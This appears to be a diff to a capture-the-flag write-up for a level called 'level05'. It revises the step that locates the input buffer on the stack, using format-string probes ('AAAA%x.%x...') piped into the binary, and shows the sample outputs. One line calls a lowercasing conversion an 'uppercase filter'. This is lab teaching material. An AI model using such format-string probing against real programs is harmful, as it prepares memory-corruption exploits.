@@ -99,30 +99,35 @@ Since we can't put shellcode in the buffer without corruption, we'll:
 
 ### Step 1: Identify Stack Layout
 
-Test with format string to find buffer position:
+Test with format string using the marker technique:
 
 ```bash
-./level05
-%p %p %p %p %p %p %p %p %p %p
+echo 'AAAA%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.' | ./level05
 ```
 
 **Output:**
 ```
-0x64 0xf7fcfac0 (nil) (nil) (nil) (nil) 0xffffffff 0xffffdc94 0xf7fdb000 0x25207025
+aaaa64.f7fcfac0.0.0.0.0.ffffffff.ffffdc94.f7fdb000.61616161.
+                                                     ^^^^^^^^
+                                                     Position 10!
 ```
 
-The 10th pointer is `0x25207025` = `"% p"` in ASCII. Our buffer starts at **position 10**!
+**Analysis:**
+- `AAAA` (0x41414141) gets converted to `aaaa` (0x61616161) by the uppercase filter
+- The hex value `61616161` appears at the 10th `%x` output
+- Our buffer starts at **stack position 10**
 
-Verify with marker test:
+Verify multiple consecutive positions:
 
 ```bash
-./level05
-AAAABBBBCCCCDDDD%10$p%11$p%12$p%13$p
+echo 'AAAABBBBCCCCDDDD%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.' | ./level05
 ```
 
 **Output:**
 ```
-aaaabbbbccccdddd0x616161610x626262620x636363630x64646464
+aaaabbbbccccdddd64.f7fcfac0.0.0.0.0.ffffffff.ffffdc94.f7fdb000.61616161.62626262.63636363.64646464.
+                                                                 ^^^^^^^^ ^^^^^^^^ ^^^^^^^^ ^^^^^^^^
+                                                                 Pos 10   Pos 11   Pos 12   Pos 13
 ```
 
 **Stack mapping confirmed:**
